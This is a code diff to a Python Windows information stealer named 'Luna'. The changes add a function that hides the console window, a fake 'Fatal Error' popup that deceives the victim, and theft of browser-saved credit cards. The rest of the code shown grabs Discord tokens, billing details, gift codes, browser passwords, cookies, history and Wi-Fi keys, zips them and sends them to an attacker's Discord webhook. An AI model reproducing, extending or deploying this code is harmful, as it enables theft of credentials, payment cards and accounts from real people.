@@ -10,7 +10,9 @@ import sqlite3
 import psutil
 import json
 import base64
+import ctypes
 
+from tkinter import messagebox
 from shutil import copy2
 from sys import exit
 from zipfile import ZipFile
@@ -22,11 +24,23 @@ from win32crypt import CryptUnprotectData
 __WEBHOOK__ = "%webhook_here%"
 __PING__ = "%ping_enabled%"
 __PINGTYPE__ = "%ping_type%"
+__ERROR__ = "%_error_enabled%"
+__HIDE__ = "%_hide_enabled%"
 
 def main(webhook: str):
     webhook = SyncWebhook.from_url(webhook, session=requests.Session())
-
+        
     threads = [browsers, ss, grabwifi, mc_tokens, epicgames_data, mfa_codes]
+
+    if __HIDE__:
+        threads.append(hide)
+    elif __HIDE__ == False:
+        pass
+    
+    if __ERROR__:
+        threads.append(fakeerror)
+    elif __ERROR__ == False:
+        pass
 
     for func in threads:
         process = threading.Thread(target=func, daemon=True)
@@ -40,7 +54,7 @@ def main(webhook: str):
     zipup()
 
     _file = None
-    _file = File(f'Luna-Logged-{os.getenv("Username")}.zip')
+    _file = File(f'{local}\\Luna-Logged-{os.getenv("Username")}.zip')
 
     content = ""
     if __PING__:
@@ -62,7 +76,7 @@ def Luna(webhook: str):
     for proc in procs:
         proc(webhook)
 
-    os.remove(f'Luna-Logged-{os.getenv("Username")}.zip')
+    os.remove(f'{local}\\Luna-Logged-{os.getenv("Username")}.zip')
 
 def try_extract(func):
     def wrapper(*args, **kwargs):
@@ -71,6 +85,12 @@ def try_extract(func):
         except Exception:
             pass
     return wrapper
+
+def fakeerror():
+    messagebox.showerror("Fatal Error", "Error code: 0x80070002\nAn internal error occured while importing modules.")
+
+def hide():
+    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(),0)
 
 class grabpcinfo():
     def __init__(self) -> None:
@@ -223,57 +243,49 @@ class grabtokens():
 
     def upload(self, webhook):
         webhook = SyncWebhook.from_url(webhook, session=requests.Session())
+
         for token in self.tokens:
             if token in self.tokens_sent:
-                return
-            else:
-                self.tokens_sent.append(token)
-                headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
-                        'Content-Type': 'application/json',
-                        'Authorization': token}
-                val = ""
+                pass
 
-                r = requests.get(self.baseurl,headers=headers).json()
+            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
+                    'Content-Type': 'application/json',
+                    'Authorization': token}
+            val = ""
 
-                username = r['username'] + '#' + r['discriminator']
-                discord_id = r['id']
-                phone = r['phone']
-                email = r['email']
+            r = requests.get(self.baseurl,headers=headers).json()
 
-                embed = Embed(title=username, color=5639644)
+            username = r['username'] + '#' + r['discriminator']
+            discord_id = r['id']
+            avatar = f"https://cdn.discordapp.com/avatars/{discord_id}/{r['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{discord_id}/{r['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{discord_id}/{r['avatar']}.png"
+            phone = r['phone']
+            email = r['email']
+            
 
-                try:
-                    if requests.get(f"https://cdn.discordapp.com/avatars/{discord_id}/{r['avatar']}.gif").status_code == 200:
-                        avatar = f"https://cdn.discordapp.com/avatars/{discord_id}/{r['avatar']}.gif"
-                        embed.set_thumbnail(url=avatar)
-                    else:
-                        avatar = f"https://cdn.discordapp.com/avatars/{discord_id}/{r['avatar']}.png"
-                        embed.set_thumbnail(url=avatar)
-                except Exception:
-                    pass
+            embed = Embed(title=username, color=5639644)
 
-                try:
-                    if r['mfa_enabled']:
-                        mfa = "✅"
-                    else:
-                        mfa = "❌"
-                except Exception:
-                    mfa = "❌"
-
-                try:
-                    if r['premium_type'] == 1:
-                        nitro = 'Nitro Classic'
-                    elif r['premium_type'] == 2:
-                        nitro = 'Nitro Boost'
-                except BaseException:
-                    nitro = 'None'
-
-                b = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources",headers=headers).json()
-
-                if b == []:
-                    methods = "None"
+            try:
+                if r['mfa_enabled']:
+                    mfa = "✅"
                 else:
-                    methods = ""
+                    mfa = "❌"
+            except Exception:
+                mfa = "❌"
+
+            try:
+                if r['premium_type'] == 1:
+                    nitro = 'Nitro Classic'
+                elif r['premium_type'] == 2:
+                    nitro = 'Nitro Boost'
+            except BaseException:
+                nitro = 'None'
+
+            b = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources",headers=headers).json()
+
+            if b == []:
+                methods = "None"
+            else:
+                methods = ""
                 try:
                     for method in b:
                         if method['type'] == 1: 
@@ -285,27 +297,32 @@ class grabtokens():
                 except TypeError: 
                     methods += "❓"
 
-                val += f'<:1119pepesneakyevil:972703371221954630> `Discord ID:` **{discord_id}** \n<:gmail:1024717106996064296> `Email:` **{email}**\n:mobile_phone: `Phone:` **{phone}**\n\n<:2fa:1024718014278533212> `2FA:` **{mfa}**\n<a:nitroboost:996004213354139658> `Nitro:` **{nitro}**\n<:billing:1024718620896538787> `Billing:` **{methods}**\n\n<:crown1:1024719305482444851> `Token:` **{token}**\n[Click to copy!](https://paste-pgpj.onrender.com/?p={token})\n'
+            val += f'<:1119pepesneakyevil:972703371221954630> `Discord ID:` **{discord_id}** \n<:gmail:1024717106996064296> `Email:` **{email}**\n:mobile_phone: `Phone:` **{phone}**\n\n<:2fa:1024718014278533212> `2FA:` **{mfa}**\n<a:nitroboost:996004213354139658> `Nitro:` **{nitro}**\n<:billing:1024718620896538787> `Billing:` **{methods}**\n\n<:crown1:1024719305482444851> `Token:` **{token}**\n[Click to copy!](https://paste-pgpj.onrender.com/?p={token})\n'
 
-                g = requests.get("https://discord.com/api/v9/users/@me/outbound-promotions/codes",headers=headers)
+            g = requests.get("https://discord.com/api/v9/users/@me/outbound-promotions/codes",headers=headers)
+                
+            val_codes = []
+            if "code" in g.text:
+                codes = json.loads(g.text)
+                try:
+                    for code in codes:
+                        val_codes.append((code['code'], code['promotion']['outbound_title']))
+                except TypeError:
+                    pass
+                    
+            if val_codes == []:
+                val += f'\n:gift: **No Gift Cards Found**\n'
+            else:
+                for c, t in val_codes:
 
-                val_codes = []
-                if "code" in g.text:
-                    codes = json.loads(g.text)
-                    try:
-                        for code in codes:
-                            val_codes.append((code['code'], code['promotion']['outbound_title']))
-                    except TypeError:
-                        pass
+                    val += f'\n:gift: `{t}:`\n**{c}**\n[Click to copy!](https://paste-pgpj.onrender.com/?p={c})\n'
 
-                if val_codes == []:
-                    val += f'\n:gift: **No Gift Cards Found**\n'
-                else:
-                    for c, t in val_codes:
-                        val += f'\n:gift: `{t}:`\n**{c}**\n[Click to copy!](https://paste-pgpj.onrender.com/?p={c})\n'
+            embed.add_field(name="Discord Info", value=val + "\u200b", inline=False)
+            embed.set_thumbnail(url=avatar)
 
-                embed.add_field(name="Discord Info", value=val + "\u200b", inline=False)
-                webhook.send(embed=embed, avatar_url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096", username="Luna")
+            webhook.send(embed=embed, avatar_url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096", username="Luna")
+            self.tokens_sent += token
+
 @try_extract
 class browsers():
     def __init__(self) -> None:
@@ -347,7 +364,8 @@ class browsers():
             self.funcs = [
                 self.cookies, 
                 self.history, 
-                self.passwords
+                self.passwords,
+                self.credit_cards
                 ]
 
             for profile in self.profiles:
@@ -358,14 +376,13 @@ class browsers():
                         pass
     
     def get_master_key(self, path: str) -> str:
-            with open(path, "r", encoding="utf-8") as f:
-                c = f.read()
-            local_state = json.loads(c)
-
-            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
-            master_key = master_key[5:]
-            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
-            return master_key
+        with open(path, "r", encoding="utf-8") as f:
+            c = f.read()
+        local_state = json.loads(c)
+        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+        master_key = master_key[5:]
+        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
+        return master_key
 
     def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
         iv = buff[3:15]
@@ -389,8 +406,6 @@ class browsers():
                 if url and username and password != "":
                     f.write("Username: {:<40} Password: {:<40} URL: {}\n".format(
                         username, password, url))
-                else:
-                    f.write("No passwords were found :(")
         cursor.close()
         conn.close()
         os.remove("Loginvault.db")
@@ -409,8 +424,6 @@ class browsers():
                 if host_key and name and value != "":
                     f.write("{}\t{}\t{}\t{}\t{}\t{}\t{}\n".format(
                         host_key, 'FALSE' if expires_utc == 0 else 'TRUE', path, 'FALSE' if host_key.startswith('.') else 'TRUE', expires_utc, name, value))
-                else:
-                    f.write("No cookies were found :(")
         cursor.close()
         conn.close()
         os.remove("Cookievault.db")
@@ -431,10 +444,26 @@ class browsers():
             sites.sort(key=lambda x: x[3], reverse=True)
             for site in sites:
                 f.write("Visit Count: {:<6} Title: {:<40}\n".format(site[2], site[1]))
-                
         cursor.close()
         conn.close()
         os.remove("Historyvault.db")
+
+    def credit_cards(self, name: str, path: str, profile: str):
+        path += '\\' + profile + '\\Web Data'
+        if not os.path.isfile(path):
+            return
+        copy2(path, "Cardvault.db")
+        conn = sqlite3.connect("Cardvault.db")
+        cursor = conn.cursor()
+        with open('.\\browser-cc\'s.txt', 'a', encoding="utf-8") as f:
+            for res in cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards").fetchall():
+                name_on_card, expiration_month, expiration_year, card_number_encrypted = res
+                if name_on_card and card_number_encrypted != "":
+                    f.write(f"Name: {name_on_card}   Expiration Month: {expiration_month}   Expiration Year: {expiration_year}   Card Number: {self.decrypt_password(card_number_encrypted, self.masterkey)}\n")
+        f.close()
+        cursor.close()
+        conn.close()
+        os.remove("Cardvault.db")
 
 def ss():
     ImageGrab.grab(
@@ -548,11 +577,15 @@ class mfa_codes():
                 f.write("No discord backup codes found")
 
 def zipup():
-    with ZipFile(f'Luna-Logged-{os.getenv("Username")}.zip', 'w') as zipf:
+    global local
+    local = os.getenv("localappdata")
+
+    with ZipFile(f'{local}\\Luna-Logged-{os.getenv("Username")}.zip', 'w') as zipf:
         files = [
             "browser-passwords.txt",
             "browser-cookies.txt", 
             "browser-history.txt",
+            "browser-cc\'s.txt",
             "wifi-passwords.txt",
             "minecraft-sessioninfo.json", 
             "minecraft-usercache.json",
